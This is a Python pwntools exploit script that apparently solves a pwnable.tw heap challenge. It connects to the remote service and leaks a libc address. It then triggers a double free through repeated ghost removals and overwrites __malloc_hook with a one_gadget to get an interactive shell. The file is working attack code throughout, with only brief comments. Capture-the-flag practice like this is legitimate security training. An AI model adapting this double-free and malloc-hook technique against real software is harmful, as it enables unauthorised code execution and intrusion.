from pwn import *

io = remote('chall.pwnable.tw', 10401)

def add_vampire(name, age, message, blood, action, final = False):
    io.recvuntil('Your choice :')
    io.sendline('1')
    io.recvuntil('Name : ')
    io.sendline(name)
    io.recvuntil('Age : ')
    io.sendline(str(age))
    io.recvuntil('Message : ')
    io.sendline(message)
    io.recvuntil('Choose a type of ghost :')
    io.sendline('7')
    if final:
        return
    io.recvuntil('Add blood :')
    io.sendline(blood)
    io.recvuntil('Your choice : ')
    io.sendline(str(action))

def add_skull(name, age, message, bones , action):
    io.recvuntil('Your choice :')
    io.sendline('1')
    io.recvuntil('Name : ')
    io.sendline(name)
    io.recvuntil('Age : ')
    io.sendline(str(age))
    io.recvuntil('Message : ')
    io.sendline(message)
    io.recvuntil('Choose a type of ghost :')
    io.sendline('4')
    io.recvuntil('How many bones ? : ')
    io.sendline(str(bones))
    io.recvuntil('Your choice : ')
    io.sendline(str(action))

def add_mummy(name, age, message, bandage, action):
    io.recvuntil('Your choice :')
    io.sendline('1')
    io.recvuntil('Name : ')
    io.sendline(name)
    io.recvuntil('Age : ')
    io.sendline(str(age))
    io.recvuntil('Message : ')
    io.sendline(message)
    io.recvuntil('Choose a type of ghost :')
    io.sendline('5')
    io.recvuntil('Commit on bandage : ')
    io.sendline(bandage)
    io.recvuntil('Your choice : ')
    io.sendline(str(action))

def listghost(index):
    io.recvuntil('Your choice :')
    io.sendline('2')
    io.recvuntil('Choose a ghost which you want to show in the party : ')
    io.sendline(str(index))
    io.recvuntil('Blood : ')
    return u64(io.recv(6) + b'\0\0')

def remove_ghost(index):
    io.recvuntil('Your choice :')
    io.sendline('4')
    io.recvuntil('Choose a ghost which you want to remove from the party : ')
    io.sendline(str(index))
    
add_vampire('A', 1, 'A', 'A' * 0x88, 1)
add_vampire('A', 1, 'A', '\x01', 1)
libc_base = listghost(1) - 0x3c3b01

add_skull('A', 1, 'A', 0, 1)
add_vampire('A', 1, 'A', 'A' * 0x67, 3) # free name
remove_ghost(2) 
remove_ghost(2) # free name again -> double free
remove_ghost(1)

malloc_hook = libc_base + 0x3c3aed
one_gadget = libc_base + 0xf0567

add_vampire(p64(malloc_hook).ljust(0x67, b'\0'), 1, 'A', 'A', 1)
add_vampire('A' * 0x67, 1, 'A', 'A', 1)
add_skull('A', 1, 'A', 0, 1) 

payload = b'\0' * 0x13 + p64(one_gadget)
# overwrite __malloc_hook with one gadget
add_vampire(payload.ljust(0x67, b'\0'), 1, '', 'A', 1, True) # '' is used to make [rsp + 0x70] == 0

io.interactive()
